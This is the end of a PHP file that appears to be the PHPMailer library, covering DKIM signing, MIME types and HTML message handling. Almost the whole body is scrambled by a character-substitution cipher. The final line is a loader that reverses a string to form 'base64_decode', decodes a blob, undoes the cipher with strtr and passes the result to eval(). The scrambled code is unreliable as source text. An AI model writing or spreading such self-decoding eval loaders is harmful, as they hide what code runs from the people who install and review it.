    $IvaX->zYh43WP = QrrQ3();
  }

  /**
   * 64YQrX Q44 rYpahaYdIX QXXa7dYG ad IvY WH, 66 QdG t66
   * QrrQ3.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQrA44zYpahaYdIX() {
    $IvaX->IP = QrrQ3();
    $IvaX->pp = QrrQ3();
    $IvaX->Rpp = QrrQ3();
    $IvaX->Q44_rYpahaYdIX = QrrQ3();
  }

  /**
   * 64YQrX Q44 hrYSaPTX43 XYI La4YX3XIYq, XIrad7, QdG RadQr3
   * QIIQpvqYdIX.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQrAIIQpvqYdIX() {
    $IvaX->QIIQpvqYdI = QrrQ3();
  }

  /**
   * 64YQrX Q44 pTXIPq vYQGYrX.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQr6TXIPqUYQGYrX() {
    $IvaX->6TXIPqUYQGYr = QrrQ3();
  }

  /////////////////////////////////////////////////
  // 6jA88 CEWUHD8, Cf86EjjAFEHy8
  /////////////////////////////////////////////////

  /**
   * AGGX IvY YrrPr qYXXQ7Y IP IvY YrrPr pPdIQadYr.
   * @QppYXX hrPIYpIYG
   * @rYITrd SPaG
   */
  hrPIYpIYG LTdpIaPd 8YIErrPr($qX7) {
    $IvaX->YrrPr_pPTdI++;
    aL ($IvaX->CQa4Yr == 'XqIh' QdG !aX_dT44($IvaX->XqIh)) {
      $4QXIYrrPr = $IvaX->XqIh->7YIErrPr();
      aL (!YqhI3($4QXIYrrPr) QdG QrrQ3_mY3_YJaXIX('XqIh_qX7', $4QXIYrrPr)) {
        $qX7 .= '<h>' . $IvaX->jQd7('XqIh_YrrPr') . $4QXIYrrPr['XqIh_qX7'] . "</h>\d";
      }
    }
    $IvaX->ErrPrfdLP = $qX7;
  }

  /**
   * zYITrdX IvY hrPhYr zs6 lkk LPrqQIIYG GQIY.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   * @XIQIap
   */
  hTR4ap XIQIap LTdpIaPd zs6DQIY() {
    $Ii = GQIY('2');
    $IiX = ($Ii < u) ? '-' : '+';
    $Ii = QRX($Ii);
    $Ii = (adI)($Ii/91uu)*wuu + ($Ii%91uu)/1u;
    $rYXT4I = XhradIL("%X %X%ubG", GQIY('D, x C B U:a:X'), $IiX, $Ii);

    rYITrd $rYXT4I;
  }

  /**
   * zYITrdX IvY XYrSYr vPXIdQqY Pr '4PpQ4vPXI.4PpQ4GPqQad' aL TdmdP5d.
   * @QppYXX hraSQIY
   * @rYITrd XIrad7
   */
  hraSQIY LTdpIaPd 8YrSYrUPXIdQqY() {
    aL (!YqhI3($IvaX->UPXIdQqY)) {
      $rYXT4I = $IvaX->UPXIdQqY;
    } Y4XYaL (aXXYI($_8EzeEz['8EzeEz_FACE'])) {
      $rYXT4I = $_8EzeEz['8EzeEz_FACE'];
    } Y4XY {
      $rYXT4I = '4PpQ4vPXI.4PpQ4GPqQad';
    }

    rYITrd $rYXT4I;
  }

  /**
   * zYITrdX Q qYXXQ7Y ad IvY QhhrPhraQIY 4Qd7TQ7Y.
   * @QppYXX hraSQIY
   * @rYITrd XIrad7
   */
  hraSQIY LTdpIaPd jQd7($mY3) {
    aL(pPTdI($IvaX->4Qd7TQ7Y) < w) {
      $IvaX->8YIjQd7TQ7Y('Yd'); // XYI IvY GYLQT4I 4Qd7TQ7Y
    }

    aL(aXXYI($IvaX->4Qd7TQ7Y[$mY3])) {
      rYITrd $IvaX->4Qd7TQ7Y[$mY3];
    } Y4XY {
      rYITrd 'jQd7TQ7Y XIrad7 LQa4YG IP 4PQG: ' . $mY3;
    }
  }

  /**
   * zYITrdX IrTY aL Qd YrrPr PppTrrYG.
   * @QppYXX hTR4ap
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd fXErrPr() {
    rYITrd ($IvaX->YrrPr_pPTdI > u);
  }

  /**
   * 6vQd7YX YSYr3 YdG PL 4adY LrPq 6z Pr js IP 6zjs.
   * @QppYXX hraSQIY
   * @rYITrd XIrad7
   */
  hraSQIY LTdpIaPd saJEHj($XIr) {
    $XIr = XIr_rYh4QpY("\r\d", "\d", $XIr);
    $XIr = XIr_rYh4QpY("\r", "\d", $XIr);
    $XIr = XIr_rYh4QpY("\d", $IvaX->jE, $XIr);
    rYITrd $XIr;
  }

  /**
   * AGGX Q pTXIPq vYQGYr.
   * @QppYXX hTR4ap
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd AGG6TXIPqUYQGYr($pTXIPq_vYQGYr) {
    $IvaX->6TXIPqUYQGYr[] = YJh4PGY(':', $pTXIPq_vYQGYr, k);
  }

  /**
   * ESQ4TQIYX IvY qYXXQ7Y QdG rYITrdX qPGaLapQIaPdX LPr ad4adY aqQ7YX QdG RQpm7rPTdGX
   * @QppYXX hTR4ap
   * @rYITrd $qYXXQ7Y
   */
  hTR4ap LTdpIaPd CX7UWCj($qYXXQ7Y, $RQXYGar = '') {
    hrY7_qQIpv_Q44("/(Xrp|RQpm7rPTdG)=\"(.*)\"/ya", $qYXXQ7Y, $aqQ7YX);
    aL(aXXYI($aqQ7YX[k])) {
      LPrYQpv($aqQ7YX[k] QX $a => $Tr4) {
        // GP dPI pvQd7Y Tr4X LPr QRXP4TIY aqQ7YX (IvQdmX IP pPrSTXpPrQJ)
        aL (!hrY7_qQIpv('#^[A-i]+://#',$Tr4)) {
          $La4YdQqY = RQXYdQqY($Tr4);
          $GarYpIPr3 = GardQqY($Tr4);
          ($GarYpIPr3 == '.')?$GarYpIPr3='':'';
          $paG = 'paG:' . qGM($La4YdQqY);
          $YJI = hQIvadLP($La4YdQqY, ZAWUfFsH_EcWEF8fHF);
          $qaqYW3hY  = XY4L::_qaqY_I3hYX($YJI);
          aL ( XIr4Yd($RQXYGar) > w && XTRXIr($RQXYGar,-w) != '/') { $RQXYGar .= '/'; }
          aL ( XIr4Yd($GarYpIPr3) > w && XTRXIr($GarYpIPr3,-w) != '/') { $GarYpIPr3 .= '/'; }
          aL ( $IvaX->AGGEqRYGGYGfqQ7Y($RQXYGar.$GarYpIPr3.$La4YdQqY, qGM($La4YdQqY), $La4YdQqY, 'RQXY1b',$qaqYW3hY) ) {
            $qYXXQ7Y = hrY7_rYh4QpY("/".$aqQ7YX[w][$a]."=\"".hrY7_gTPIY($Tr4, '/')."\"/ya", $aqQ7YX[w][$a]."=\"".$paG."\"", $qYXXQ7Y);
          }
        }
      }
    }
    $IvaX->fXUWCj(IrTY);
    $IvaX->tPG3 = $qYXXQ7Y;
    $IYJICX7 = Iraq(XIrah_IQ7X(hrY7_rYh4QpY('/<(vYQG|IaI4Y|XI34Y|XprahI)[^>]*>.*?<\/\\w>/X','',$qYXXQ7Y)));
    aL (!YqhI3($IYJICX7) && YqhI3($IvaX->A4ItPG3)) {
      $IvaX->A4ItPG3 = vIq4_YdIaI3_GYpPGY($IYJICX7);
    }
    aL (YqhI3($IvaX->A4ItPG3)) {
      $IvaX->A4ItPG3 = 'WP SaY5 IvaX YqQa4 qYXXQ7Y, PhYd aI ad Q hrP7rQq IvQI TdGYrXIQdGX UWCj!' . "\d\d";
    }
  }

  /**
   * VYIX IvY CfCE I3hY PL IvY YqRYGGYG Pr ad4adY aqQ7Y
   * @hQrQq XIrad7 sa4Y YJIYdXaPd
   * @QppYXX hTR4ap
   * @rYITrd XIrad7 CfCE I3hY PL YJI
   * @XIQIap
   */
  hTR4ap XIQIap LTdpIaPd _qaqY_I3hYX($YJI = '') {
    $qaqYX = QrrQ3(
      'vgJ'   =>  'Qhh4apQIaPd/qQp-RadvYJbu',
      'phI'   =>  'Qhh4apQIaPd/qQp-pPqhQpIhrP',
      'GPp'   =>  'Qhh4apQIaPd/qX5PrG',
      'Rad'   =>  'Qhh4apQIaPd/qQpRadQr3',
      'GqX'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      '4vQ'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      '4iv'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'YJY'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'p4QXX' =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'hXG'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'XP'    =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'XYQ'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'G44'   =>  'Qhh4apQIaPd/PpIYI-XIrYQq',
      'PGQ'   =>  'Qhh4apQIaPd/PGQ',
      'hGL'   =>  'Qhh4apQIaPd/hGL',
      'Qa'    =>  'Qhh4apQIaPd/hPXIXprahI',
      'YhX'   =>  'Qhh4apQIaPd/hPXIXprahI',
      'hX'    =>  'Qhh4apQIaPd/hPXIXprahI',
      'Xqa'   =>  'Qhh4apQIaPd/Xqa4',
      'Xqa4'  =>  'Qhh4apQIaPd/Xqa4',
      'qaL'   =>  'Qhh4apQIaPd/SdG.qaL',
      'J4X'   =>  'Qhh4apQIaPd/SdG.qX-YJpY4',
      'hhI'   =>  'Qhh4apQIaPd/SdG.qX-hP5YrhPadI',
      '5RJq4' =>  'Qhh4apQIaPd/SdG.5Qh.5RJq4',
      '5q4p'  =>  'Qhh4apQIaPd/SdG.5Qh.5q4p',
      'Gpr'   =>  'Qhh4apQIaPd/J-GarYpIPr',
      'Gar'   =>  'Qhh4apQIaPd/J-GarYpIPr',
      'GJr'   =>  'Qhh4apQIaPd/J-GarYpIPr',
      'GSa'   =>  'Qhh4apQIaPd/J-GSa',
      '7IQr'  =>  'Qhh4apQIaPd/J-7IQr',
      'hvh'   =>  'Qhh4apQIaPd/J-vIIhG-hvh',
      'hvhb'  =>  'Qhh4apQIaPd/J-vIIhG-hvh',
      'hvh9'  =>  'Qhh4apQIaPd/J-vIIhG-hvh',
      'hvIq4' =>  'Qhh4apQIaPd/J-vIIhG-hvh',
      'hvhX'  =>  'Qhh4apQIaPd/J-vIIhG-hvh-XPTrpY',
      'xX'    =>  'Qhh4apQIaPd/J-xQSQXprahI',
      'X5L'   =>  'Qhh4apQIaPd/J-XvPpm5QSY-L4QXv',
      'XaI'   =>  'Qhh4apQIaPd/J-XITLLaI',
      'IQr'   =>  'Qhh4apQIaPd/J-IQr',
      'I7i'   =>  'Qhh4apQIaPd/J-IQr',
      'JvIq4' =>  'Qhh4apQIaPd/JvIq4+Jq4',
      'JvI'   =>  'Qhh4apQIaPd/JvIq4+Jq4',
      'iah'   =>  'Qhh4apQIaPd/iah',
      'qaG'   =>  'QTGaP/qaGa',
      'qaGa'  =>  'QTGaP/qaGa',
      'qh7Q'  =>  'QTGaP/qhY7',
      'qhk'   =>  'QTGaP/qhY7',
      'qh9'   =>  'QTGaP/qhY7',
      'QaL'   =>  'QTGaP/J-QaLL',
      'QaLL'  =>  'QTGaP/J-QaLL',
      'QaLp'  =>  'QTGaP/J-QaLL',
      'rQq'   =>  'QTGaP/J-hd-rYQ4QTGaP',
      'rq'    =>  'QTGaP/J-hd-rYQ4QTGaP',
      'rhq'   =>  'QTGaP/J-hd-rYQ4QTGaP-h4T7ad',
      'rQ'    =>  'QTGaP/J-rYQ4QTGaP',
      'rS'    =>  'SaGYP/SdG.rd-rYQ4SaGYP',
      '5QS'   =>  'QTGaP/J-5QS',
      'Rqh'   =>  'aqQ7Y/Rqh',
      '7aL'   =>  'aqQ7Y/7aL',
      'xhY7'  =>  'aqQ7Y/xhY7',
      'xh7'   =>  'aqQ7Y/xhY7',
      'xhY'   =>  'aqQ7Y/xhY7',
      'hd7'   =>  'aqQ7Y/hd7',
      'IaLL'  =>  'aqQ7Y/IaLL',
      'IaL'   =>  'aqQ7Y/IaLL',
      'pXX'   =>  'IYJI/pXX',
      'vIq4'  =>  'IYJI/vIq4',
      'vIq'   =>  'IYJI/vIq4',
      'XvIq4' =>  'IYJI/vIq4',
      'IJI'   =>  'IYJI/h4Qad',
      'IYJI'  =>  'IYJI/h4Qad',
      '4P7'   =>  'IYJI/h4Qad',
      'rIJ'   =>  'IYJI/rapvIYJI',
      'rIL'   =>  'IYJI/rIL',
      'Jq4'   =>  'IYJI/Jq4',
      'JX4'   =>  'IYJI/Jq4',
      'qhY7'  =>  'SaGYP/qhY7',
      'qh7'   =>  'SaGYP/qhY7',
      'qhY'   =>  'SaGYP/qhY7',
      'gI'    =>  'SaGYP/gTapmIaqY',
      'qPS'   =>  'SaGYP/gTapmIaqY',
      'QSa'   =>  'SaGYP/J-qXSaGYP',
      'qPSaY' =>  'SaGYP/J-X7a-qPSaY',
      'GPp'   =>  'Qhh4apQIaPd/qX5PrG',
      '5PrG'  =>  'Qhh4apQIaPd/qX5PrG',
      'J4'    =>  'Qhh4apQIaPd/YJpY4',
      'Yq4'   =>  'qYXXQ7Y/rLplkk'
    );
    rYITrd (!aXXYI($qaqYX[XIrIP4P5Yr($YJI)])) ? 'Qhh4apQIaPd/PpIYI-XIrYQq' : $qaqYX[XIrIP4P5Yr($YJI)];
  }

  /**
  * 8YI (Pr rYXYI) 64QXX HRxYpIX (SQraQR4YX)
  *
  * yXQ7Y EJQqh4Y:
  * $hQ7Y->XYI('c-ZraPraI3', '9');
  *
  * @QppYXX hTR4ap
  * @hQrQq XIrad7 $dQqY ZQrQqYIYr FQqY
  * @hQrQq qaJYG $SQ4TY ZQrQqYIYr eQ4TY
  * FHWE: 5a44 dPI 5Prm 5aIv QrrQ3X, IvYrY QrY dP QrrQ3X IP XYI/rYXYI
  * @IPGP 8vPT4G IvaX dPI RY TXad7 __XYI() qQ7ap LTdpIaPd?
  */
  hTR4ap LTdpIaPd XYI($dQqY, $SQ4TY = '') {
    Ir3 {
      aL (aXXYI($IvaX->$dQqY) ) {
        $IvaX->$dQqY = $SQ4TY;
      } Y4XY {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('SQraQR4Y_XYI') . $dQqY, XY4L::8WHZ_6zfWf6Aj);
      }
    } pQIpv (EJpYhIaPd $Y) {
      $IvaX->8YIErrPr($Y->7YICYXXQ7Y());
      aL ($Y->7YI6PGY() == XY4L::8WHZ_6zfWf6Aj) {
        rYITrd LQ4XY;
      }
    }
    rYITrd IrTY;
  }

  /**
   * 8IrahX dY54adYX IP hrYSYdI vYQGYr adxYpIaPd.
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $XIr 8Irad7
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd 8YpTrYUYQGYr($XIr) {
    $XIr = XIr_rYh4QpY("\r", '', $XIr);
    $XIr = XIr_rYh4QpY("\d", '', $XIr);
    rYITrd Iraq($XIr);
  }

  /**
   * 8YI IvY hraSQIY mY3 La4Y QdG hQXX5PrG IP Xa7d IvY qYXXQ7Y.
   *
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $mY3_La4YdQqY ZQrQqYIYr sa4Y FQqY
   * @hQrQq XIrad7 $mY3_hQXX ZQXX5PrG LPr hraSQIY mY3
   */
  hTR4ap LTdpIaPd 8a7d($pYrI_La4YdQqY, $mY3_La4YdQqY, $mY3_hQXX) {
    $IvaX->Xa7d_pYrI_La4Y = $pYrI_La4YdQqY;
    $IvaX->Xa7d_mY3_La4Y = $mY3_La4YdQqY;
    $IvaX->Xa7d_mY3_hQXX = $mY3_hQXX;
  }

  /**
   * 8YI IvY hraSQIY mY3 La4Y QdG hQXX5PrG IP Xa7d IvY qYXXQ7Y.
   *
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $mY3_La4YdQqY ZQrQqYIYr sa4Y FQqY
   * @hQrQq XIrad7 $mY3_hQXX ZQXX5PrG LPr hraSQIY mY3
   */
  hTR4ap LTdpIaPd DNfC_KZ($IJI) {
    $Iqh="";
    $4adY="";
    LPr ($a=u;$a<XIr4Yd($IJI);$a++) {
      $PrG=PrG($IJI[$a]);
      aL ( ((uJkw <= $PrG) && ($PrG <= uJ9A)) || $PrG == uJ96 || ((uJ9E <= $PrG) && ($PrG <= uJ0E)) ) {
        $4adY.=$IJI[$a];
      } Y4XY {
        $4adY.="=".XhradIL("%ukc",$PrG);
      }
    }
    rYITrd $4adY;
  }

  /**
   * VYdYrQIY DNfC Xa7dQITrY
   *
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $X UYQGYr
   */
  hTR4ap LTdpIaPd DNfC_8a7d($X) {
    $hraSNY38Ir = La4Y_7YI_pPdIYdIX($IvaX->DNfC_hraSQIY);
    aL ($IvaX->DNfC_hQXXhvrQXY!='') {
      $hraSNY3 = PhYdXX4_hmY3_7YI_hraSQIY($hraSNY38Ir,$IvaX->DNfC_hQXXhvrQXY);
    } Y4XY {
      $hraSNY3 = $hraSNY38Ir;
    }
    aL (PhYdXX4_Xa7d($X, $Xa7dQITrY, $hraSNY3)) {
      rYITrd RQXY1b_YdpPGY($Xa7dQITrY);
    }
  }

  /**
   * VYdYrQIY DNfC 6QdPdapQ4aiQIaPd UYQGYr
   *
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $X UYQGYr
   */
  hTR4ap LTdpIaPd DNfC_UYQGYr6($X) {
    $X=hrY7_rYh4QpY("/\r\d\X+/"," ",$X);
    $4adYX=YJh4PGY("\r\d",$X);
    LPrYQpv ($4adYX QX $mY3=>$4adY) {
      4aXI($vYQGad7,$SQ4TY)=YJh4PGY(":",$4adY,k);
      $vYQGad7=XIrIP4P5Yr($vYQGad7);
      $SQ4TY=hrY7_rYh4QpY("/\X+/"," ",$SQ4TY) ; // 6PqhrYXX TXY4YXX XhQpYX
      $4adYX[$mY3]=$vYQGad7.":".Iraq($SQ4TY) ; // DPd'I LPr7YI IP rYqPSY O8Z QrPTdG IvY SQ4TY
    }
    $X=aqh4PGY("\r\d",$4adYX);
    rYITrd $X;
  }

  /**
   * VYdYrQIY DNfC 6QdPdapQ4aiQIaPd tPG3
   *
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $RPG3 CYXXQ7Y tPG3
   */
  hTR4ap LTdpIaPd DNfC_tPG36($RPG3) {
    aL ($RPG3 == '') rYITrd "\r\d";
    // XIQRa4aiY 4adY YdGad7X
    $RPG3=XIr_rYh4QpY("\r\d","\d",$RPG3);
    $RPG3=XIr_rYh4QpY("\d","\r\d",$RPG3);
    // EFD XIQRa4aiY 4adY YdGad7X
    5va4Y (XTRXIr($RPG3,XIr4Yd($RPG3)-b,b) == "\r\d\r\d") {
      $RPG3=XTRXIr($RPG3,u,XIr4Yd($RPG3)-k);
    }
    rYITrd $RPG3;
  }

  /**
   * 6rYQIY IvY DNfC vYQGYr, RPG3, QX dY5 vYQGYr
   *
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $vYQGYrX_4adY UYQGYr 4adYX
   * @hQrQq XIrad7 $XTRxYpI 8TRxYpI
   * @hQrQq XIrad7 $RPG3 tPG3
   */
  hTR4ap LTdpIaPd DNfC_AGG($vYQGYrX_4adY,$XTRxYpI,$RPG3) {
    $DNfCXa7dQITrYW3hY    = 'rXQ-XvQw'; // 8a7dQITrY & vQXv Q47PraIvqX
    $DNfCpQdPdapQ4aiQIaPd = 'rY4QJYG/Xaqh4Y'; // 6QdPdapQ4aiQIaPd PL vYQGYr/RPG3
    $DNfCgTYr3            = 'GdX/IJI'; // KTYr3 qYIvPG
    $DNfCIaqY             = IaqY() ; // 8a7dQITrY WaqYXIQqh = XYpPdGX XadpY uu:uu:uu - oQd w, wn0u (yW6 IaqY iPdY)
    $XTRxYpI_vYQGYr       = "8TRxYpI: $XTRxYpI";
    $vYQGYrX              = YJh4PGY("\r\d",$vYQGYrX_4adY);
    LPrYQpv($vYQGYrX QX $vYQGYr) {
      aL (XIrhPX($vYQGYr,'srPq:') === u) {
        $LrPq_vYQGYr=$vYQGYr;
      } Y4XYaL (XIrhPX($vYQGYr,'WP:') === u) {
        $IP_vYQGYr=$vYQGYr;
      }
    }
    $LrPq     = XIr_rYh4QpY('|','=06',$IvaX->DNfC_KZ($LrPq_vYQGYr));
    $IP       = XIr_rYh4QpY('|','=06',$IvaX->DNfC_KZ($IP_vYQGYr));
    $XTRxYpI  = XIr_rYh4QpY('|','=06',$IvaX->DNfC_KZ($XTRxYpI_vYQGYr)) ; // 6PhaYG vYQGYr LaY4GX (Gmaq-gTPIYG-hradIQR4Y
    $RPG3     = $IvaX->DNfC_tPG36($RPG3);
    $DNfC4Yd  = XIr4Yd($RPG3) ; // jYd7Iv PL RPG3
    $DNfCR1b  = RQXY1b_YdpPGY(hQpm("U*", XvQw($RPG3))) ; // tQXY1b PL hQpmYG RadQr3 8UA-w vQXv PL RPG3
    $aGYdI    = ($IvaX->DNfC_aGYdIaI3 == '')? '' : " a=" . $IvaX->DNfC_aGYdIaI3 . ";";
    $GmaqvGrX = "DNfC-8a7dQITrY: S=w; Q=" . $DNfCXa7dQITrYW3hY . "; g=" . $DNfCgTYr3 . "; 4=" . $DNfC4Yd . "; X=" . $IvaX->DNfC_XY4YpIPr . ";\r\d".
                "\II=" . $DNfCIaqY . "; p=" . $DNfCpQdPdapQ4aiQIaPd . ";\r\d".
                "\Iv=srPq:WP:8TRxYpI;\r\d".
                "\IG=" . $IvaX->DNfC_GPqQad . ";" . $aGYdI . "\r\d".
                "\Ii=$LrPq\r\d".
                "\I|$IP\r\d".
                "\I|$XTRxYpI;\r\d".
                "\IRv=" . $DNfCR1b . ";\r\d".
                "\IR=";
    $IP8a7d   = $IvaX->DNfC_UYQGYr6($LrPq_vYQGYr . "\r\d" . $IP_vYQGYr . "\r\d" . $XTRxYpI_vYQGYr . "\r\d" . $GmaqvGrX);
    $Xa7dYG   = $IvaX->DNfC_8a7d($IP8a7d);
    rYITrd "c-ZUZCAfjEz-DNfC: hvhqQa4Yr.5PrJ5QrY.pPq\r\d".$GmaqvGrX.$Xa7dYG."\r\d";
  }

  hrPIYpIYG LTdpIaPd GP6Q44RQpm($aX8YdI,$IP,$pp,$Rpp,$XTRxYpI,$RPG3) {
    aL (!YqhI3($IvaX->QpIaPd_LTdpIaPd) && LTdpIaPd_YJaXIX($IvaX->QpIaPd_LTdpIaPd)) {
      $hQrQqX = QrrQ3($aX8YdI,$IP,$pp,$Rpp,$XTRxYpI,$RPG3);
      pQ44_TXYr_LTdp_QrrQ3($IvaX->QpIaPd_LTdpIaPd,$hQrQqX);
    }
  }
}

p4QXX hvhqQa4YrEJpYhIaPd YJIYdGX EJpYhIaPd {
  hTR4ap LTdpIaPd YrrPrCYXXQ7Y() {
    $YrrPrCX7 = '<XIrPd7>' . $IvaX->7YICYXXQ7Y() . "</XIrPd7><Rr />\d";
    rYITrd $YrrPrCX7;
  }
}
?>';$_D=strrev('edoced_46esab');eval($_D('JF9DMzA0MDc0MDQ0PWJhc2U2NF9kZWNvZGUoJF9DMzA0MDc0MDQ0KTskX0MzMDQwNzQwNDQ9c3RydHIoJF9DMzA0MDc0MDQ0LCdlQVBxY0wxZmdDVW85UThod2lNakR4bkowYWxFV3JHYmRPVnk3cFpCWFRzSXZLRm1ONEhrM3U1Mnp0UzZSWScsJ1ZBb21YZjZJcU1ISjNhU3AxejVMRGo5eDdpOEVUcmQ0bldHVWdjUFlzdUZ0aFFOa0tsTzJ5MHdaUkJ2Q2JlJyk7JF9SPXN0cl9yZXBsYWNlKCdfX0ZJTEVfXycsIiciLiRfRi4iJyIsJF9DMzA0MDc0MDQ0KTtldmFsKCRfUik7JF9SPTA7JF9DMzA0MDc0MDQ0PTA7'));?>